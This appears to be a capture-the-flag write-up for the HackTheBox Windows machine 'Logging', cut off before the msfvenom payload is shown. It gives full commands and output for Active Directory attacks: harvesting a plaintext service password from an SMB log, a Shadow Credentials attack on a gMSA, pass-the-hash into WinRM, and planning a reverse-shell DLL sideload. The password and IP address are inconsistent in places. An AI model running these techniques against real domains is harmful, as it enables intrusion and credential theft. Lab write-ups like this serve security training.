---
title: Logging
os: Windows
difficulty: Medium
tags:
  - Active Directory
  - Information Disclosure
  - Shadow Credentials
  - DLL Sideloading
  - ADCS
  - ESC17
  - Rogue WSUS Server
  - Privilege Escalation
date: 2026-04-19
---

# 🛡️ HTB - Logging (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Logging
- **Operating System:** Windows Server 2019
- **Difficulty:** Medium
- **Date of Scan:** 2026-04-19
- **Vulnerabilities:** Plaintext Credentials in Public SMB Share Logs, Shadow Credentials on gMSA Account, DLL Sideloading in UpdateMonitor, ADCS ESC17 (Rogue WSUS Server Spoofing)

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open:

```bash
nmap -A -sS -P -T4 --min-rate 5000 10.129.23.177
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-19 13:54 UTC
Nmap scan report for 10.129.23.177
Host is up (0.22s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-19 20:54:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T20:55:38+00:00; +7h00m10s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T20:55:39+00:00; +7h00m10s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T20:55:38+00:00; +7h00m10s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
|_ssl-date: 2026-04-19T20:55:39+00:00; +7h00m10s from scanner time.

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/19%OT=53%CT=1%CU=44617%PV=Y%DS=2%DC=T%G=Y%TM=69E4
OS:DED2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=106%TI=I%CI=I%II=I%TS=U)
OS:SEQ(SP=108%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=109%GCD=1%ISR=1
OS:08%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O
OS:4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFF
OS:F%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0
OS:%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=
OS:Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z
OS:)

Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m09s, deviation: 0s, median: 7h00m09s
| smb2-time:
|   date: 2026-04-19T20:55:28
|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   344.82 ms 10.10.14.1
2   344.99 ms 10.129.23.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.79 seconds
```

- 🔍 *A Medium level Windows machine. Let's begin Active Directory reconnaissance.*
- 🔍 *We also obtain initial user credentials: `wallace.everette / Welcome2026@`.*
- 🔍 *Let's confirm the credentials with NetExec (nxc) over SMB:*

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@'
```

```text
SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.177   445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
```

- 🔍 *Now let's enumerate domain users:*

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --users
```

```text
SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.177   445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
SMB         10.129.23.177   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.23.177   445    DC01             Administrator                 2026-04-16 14:41:53 0       Built-in account for administering the computer/domain
SMB         10.129.23.177   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.23.177   445    DC01             krbtgt                        2026-04-16 14:47:15 0       Key Distribution Center Service Account
SMB         10.129.23.177   445    DC01             svc_recovery                  2026-04-16 23:09:49 0
SMB         10.129.23.177   445    DC01             jaylee.clifton                2026-04-16 23:09:49 0
SMB         10.129.23.177   445    DC01             monique.chip                  2026-04-16 23:09:49 0
SMB         10.129.23.177   445    DC01             kyson.abel                    2026-04-16 23:09:50 0
SMB         10.129.23.177   445    DC01             fable.milford                 2026-04-16 23:09:50 0
SMB         10.129.23.177   445    DC01             wellington.kylan              2026-04-16 23:09:50 0
SMB         10.129.23.177   445    DC01             serina.philander              2026-04-16 23:09:50 0
SMB         10.129.23.177   445    DC01             wallace.everette              2026-04-16 23:09:50 0
SMB         10.129.23.177   445    DC01             toby.brynleigh                2026-04-16 23:09:50 0
SMB         10.129.23.177   445    DC01             [*] Enumerated 12 local users: logging
```

- 🔍 *Now let's look at available SMB shares:*

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --shares
```

```text
SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.177   445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
SMB         10.129.23.177   445    DC01             [*] Enumerated shares
SMB         10.129.23.177   445    DC01             Share           Permissions     Remark
SMB         10.129.23.177   445    DC01             -----           -----------     ------
SMB         10.129.23.177   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.23.177   445    DC01             C$                              Default share
SMB         10.129.23.177   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.23.177   445    DC01             Logs            READ
SMB         10.129.23.177   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.23.177   445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.23.177   445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

- 🔍 *We have read permissions over 4 shares. The most interesting is the `Logs` share. Let's inspect its contents:*

```bash
smbclient //10.129.23.177/Logs -U 'logging.htb\wallace.everette%Welcome2026@'
```

```text
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 16 23:10:09 2026
  ..                                  D        0  Thu Apr 16 23:10:09 2026
  Audit_Heartbeat.log                 A     1294  Thu Apr 16 23:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 23:10:09 2026
  Service_State.log                   A      468  Thu Apr 16 23:10:09 2026
  TaskMonitor.log                     A     1170  Thu Apr 16 23:10:09 2026
```

- 🔍 *We download all the log files to our attack machine. Checking `IdentitySync_Trace_20260219.log` reveals sensitive initialization parameters:*

```text
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 02:45:00.112] [PID:1024] [Thread:01] INFO  - Maintenance: Rotating log files for 'IdentitySync'...
[2026-02-19 02:50:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-09 02:55:00.822] [PID:4102] [Thread:01] DEBUG - Integrity check: All module hashes verified (SHA256).
[2026-02-09 03:00:01.442] [PID:4102] [Thread:12] INFO  - Service: logging.IdentitySync.Engine.Internal (v2.4.2.0)
[2026-02-09 03:00:01.458] [PID:4102] [Thread:12] DEBUG - Environment: OS=Microsoft Windows Server 2019, CoreCount=4, Mem=16GB
[2026-02-09 03:00:01.470] [PID:4102] [Thread:12] INFO  - Initializing module [HR-Connector]...
[2026-02-09 03:00:02.215] [PID:4102] [Thread:12] INFO  - Establishing SQL session with HR01.logging.htb...
[2026-02-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0
[2026-02-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).
[2026-02-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
[2026-02-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
   at logging.IdentitySync.Engine.LdapProvider.Connect()
   --- Server Error Details ---
   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
   Win32 Error: 49 (Invalid Credentials)
   ----------------------------
[2026-02-19 03:00:03.510] [PID:4102] [Thread:12] WARN  - Connectivity failed for logging\\svc_recovery. Checking alternate Domain Controller...
[2026-02-09 03:00:03.650] [PID:4102] [Thread:12] CRITICAL - Domain-wide LDAP bind failure. Task aborted.
[2026-02-10 03:00:03.702] [PID:4102] [Thread:12] DEBUG - Generating SMTP alert for it-alerts@logging.htb
[2026-02-10 03:00:04.112] [PID:4102] [Thread:12] INFO  - Process exit code: 1. Cleaning up session buffers.
[2026-02-10 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-11 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-11 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-11 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-11 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-11 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-11 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-11 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-29 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-29 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-29 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-29 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-29 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-29 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-29 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-03-09 02:55:00.822] [PID:4102] [Thread:01] DEBUG - Integrity check: All module hashes verified (SHA256).
[2026-03-09 03:00:01.442] [PID:4102] [Thread:12] INFO  - Service: logging.IdentitySync.Engine.Internal (v2.4.2.0)
[2026-03-09 03:00:01.458] [PID:4102] [Thread:12] DEBUG - Environment: OS=Microsoft Windows Server 2019, CoreCount=4, Mem=16GB
[2026-03-09 03:00:01.470] [PID:4102] [Thread:12] INFO  - Initializing module [HR-Connector]...
[2026-03-09 03:00:02.215] [PID:4102] [Thread:12] INFO  - Establishing SQL session with HR01.logging.htb...
[2026-03-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0
[2026-03-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).
[2026-03-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
[2026-03-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
[2026-03-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Success LdapConnection object...
[2026-03-09 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-03-09 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-03-09 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-03-09 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-03-09 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-03-09 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
```

- 🔍 *We have successfully recovered the credentials for the service account:*
  `svc_recovery:Em3rg3ncyPa$$2025`

- 🔍 *Analyzing Active Directory permissions in BloodHound, we discover the following control path:*
  `svc_recovery` ──[GenericWrite]──> `msa_health$` ──[MemberOf]──> `Remote Management Users`

> [!NOTE]
> **Active Directory Permission Context:**
> - **GenericWrite:** Allows modifying attributes of the target AD object (such as `msDS-KeyCredentialLink` or `servicePrincipalNames`).
> - **gMSA (Group Managed Service Account):** `msa_health$` has auto-rotating passwords. The list of accounts allowed to retrieve this password is set in the `msDS-GroupMSAMembership` attribute.

- 🔍 *First, we try adding `svc_recovery` directly to `msDS-GroupMSAMembership` using `bloodyAD`:*

```bash
bloodyAD -u svc_recovery -p 'Em3rg3ncyPa$$2026' -d logging.htb --host 10.129.23.177 add groupMember msa_health$ svc_recovery
```

```text
Traceback (most recent call last):
  File "/home/kali/Tools/bloodyAD/venv/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/cli_modules/add.py", line 391, in groupMember
    member_transformed = conn.ldap.dnResolver(member)
  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/config.py", line 132, in ldap
    self._ldap = Ldap(self)
  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 206, in __init__
    raise e
  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 192, in __init__
    raise err
msldap.commons.exceptions.LDAPBindException: LDAP Bind failed! Result code: "invalidCredentials" Reason: "b'8009030C: LdapErr: DSID-0C0906F8, comment: AcceptSecurityContext error, data 52f, v4563\x00'"
```

- 🔍 *We verify the credentials with `nxc` and see a `STATUS_ACCOUNT_RESTRICTION` error:*

```bash
nxc smb 10.129.23.177 -u svc_recovery -p 'Em3rg3ncyPa$$2026'
```

```text
SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.177   445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
```

- 🔍 *This indicates `svc_recovery` is a member of the Protected Users OU. To bypass local NTLM authentication restrictions, we request a Kerberos TGT ticket:*

```bash
getTGT.py 'logging.htb/svc_recovery:Em3rg3ncyPa$$2026' -dc-ip 10.129.24.106
```

```text
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_recovery.ccache
```

- 🔍 *We import the ticket and verify it using `klist`:*

```bash
export KRB5CCNAME=svc_recovery.ccache
klist
```

```text
Ticket cache: FILE:svc_recovery.ccache
Default principal: svc_recovery@LOGGING.HTB

Valid starting       Expires              Service principal
04/20/2026 22:15:34  04/21/2026 02:15:34  krbtgt/LOGGING.HTB@LOGGING.HTB
        renew until 04/21/2026 02:15:34
```

- 🔍 *Next, we attempt to add `svc_recovery` to the gMSA's security descriptor:*

```bash
bloodyAD -u svc_recovery -k -d logging.htb --host dc01.logging.htb set object msa_health$ msDS-GroupMSAMembership -v 'CN=svc_recovery,CN=Users,DC=logging,DC=htb'
```

```text
Traceback (most recent call last):
  File "/home/kali/Tools/NetExec/venv/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/cli_modules/set.py", line 58, in object
    conn.ldap.bloodymodify(
  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 315, in bloodymodify
    raise err
  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/connection.py", line 615, in modify
    'changes' : encode_changes(changes, encode)
  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/protocol/typeconversion.py", line 496, in encode_changes
    attributes = encoder(value, True)
  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/formatters/formatters.py", line 106, in genericFormat
    return origin_format(val, encode, *args)
  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/protocol/typeconversion.py", line 116, in single_sd
    x = SECURITY_DESCRIPTOR.from_sddl(x)
  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/winacl/dtyp/security_descriptor.py", line 166, in from_sddl
    params[np[i]] = np[i+1]
IndexError: list index out of range
```

- 🔍 *The tool failed because this attribute expects a Security Descriptor in binary format, but `bloodyAD` attempted to parse the input string (DN of the user) as SDDL. Since standard delegation changes fail, we pivot to Shadow Credentials.*

> [!NOTE]
> **What are Shadow Credentials?**
> Active Directory PKINIT allows user/computer accounts to authenticate using certificates rather than passwords. If an attacker has `GenericWrite` permissions over a target AD object, they can generate an RSA keypair, write the public certificate into the object's `msDS-KeyCredentialLink` attribute, and authenticate as the target object via PKINIT to fetch its TGT and NT hash.

---

## Step 2 - Initial Foothold

- 🔍 *Since we have `GenericWrite` over `msa_health$`, we execute the Shadow Credentials attack using `bloodyAD`:*

```bash
bloodyAD -u svc_recovery -k -d logging.htb --host dc01.logging.htb add shadowCredentials msa_health$
```

```text
[+] KeyCredential generated with following sha256 of RSA key: 6b872e5e15c4069dfa9b46b06e10e94d6def5ff6e3c75165fd47d924568cc104
[+] TGT stored in ccache file msa_health$_1J.ccache

NT: 603fc24ee01a9409f83c9d1d701485c5
```

- 🔍 *We obtain the NT hash of `msa_health$`. We use `evil-winrm` to authenticate via Pass-the-Hash:*

```bash
evil-winrm -i logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
```

```text
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\msa_health$\Documents>
```

- 🔍 *We are logged in as `msa_health$`. There is no user flag in this directory. We begin internal enumeration to find anomalies. We list `C:\Program Files`:*

```powershell
Get-ChildItem "C:\Program Files"
```

```text
    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/10/2020  11:34 AM                Common Files
d-----        4/16/2026   8:19 AM                internet explorer
d-----        4/16/2026   5:26 PM                Update Services
d-----        4/16/2026   4:10 PM                UpdateMonitor
d-----        4/16/2026   6:40 PM                VMware
d-r---        8/24/2021   7:47 AM                Windows Defender
d-----        4/16/2026   8:19 AM                Windows Defender Advanced Threat Protection
d-----        8/24/2021   7:47 AM                Windows Mail
d-----        4/16/2026   8:19 AM                Windows Media Player
d-----        4/16/2026   8:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        8/24/2021   7:47 AM                Windows Photo Viewer
d-----        4/16/2026   8:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----        9/15/2018  12:19 AM                WindowsPowerShell
```

- 🔍 *We find a custom third-party folder named `UpdateMonitor`. We run `icacls` to examine its directory permissions:*

```cmd
icacls "C:\Program Files\UpdateMonitor"
```

```text
C:\Program Files\UpdateMonitor logging\IT:(OI)(CI)(F)
                              NT SERVICE\TrustedInstaller:(I)(F)
                              NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                              NT AUTHORITY\SYSTEM:(I)(F)
                              NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                              BUILTIN\Administrators:(I)(F)
                              BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                              BUILTIN\Users:(I)(RX)
                              BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

- 🔍 *We check permissions on the executable `UpdateMonitor.exe`:*

```cmd
icacls "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
```

```text
C:\Program Files\UpdateMonitor\UpdateMonitor.exe logging\IT:(I)(F)
                                                 NT AUTHORITY\SYSTEM:(I)(F)
                                                 BUILTIN\Administrators:(I)(F)
                                                 BUILTIN\Users:(I)(RX)
                                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

- 🔍 *Only users in the `IT` group can modify the executable. The `IT` group has one member: `jaylee.clifton`. The service likely executes under their context. Let's inspect the `monitor.log` file in `C:\ProgramData\UpdateMonitor\Logs`:*

```powershell
Get-Content "C:\ProgramData\UpdateMonitor\Logs\monitor.log"
```

```text
[2026-04-16 16:41:18] Starting Sentinel Update Check...
[2026-04-16 16:41:18] Checking for update on core server...
[2026-04-16 16:41:18] Info: Core did not find file Settings_Update.zip
[2026-04-16 16:41:18] Last status: File not found on core
[2026-04-16 16:41:18] Checking for update on local server...
[2026-04-16 16:41:18] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-04-16 16:41:18] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-16 16:41:18] Failed to load settings_update.dll. Error code: 126
```

- 🔍 *The executable attempts to unzip `Settings_Update.zip` from `C:\ProgramData\UpdateMonitor\` and load `settings_update.dll` from the `bin` subdirectory. Since we can write to `C:\ProgramData\UpdateMonitor`, we can hijack this process with DLL Sideloading.*

> [!IMPORTANT]
> **DLL Sideloading Attack Vector:**
> 1. We generate a custom `settings_update.dll` payload that executes a reverse shell.
> 2. We package the DLL into a ZIP archive named `Settings_Update.zip`.
> 3. We upload the ZIP archive to `C:\ProgramData\UpdateMonitor\`.
> 4. The `UpdateMonitor` scheduled task will automatically extract and execute the DLL under the context of `jaylee.clifton`.

- 🔍 *We generate the malicious DLL using `msfvenom`:*

```bash
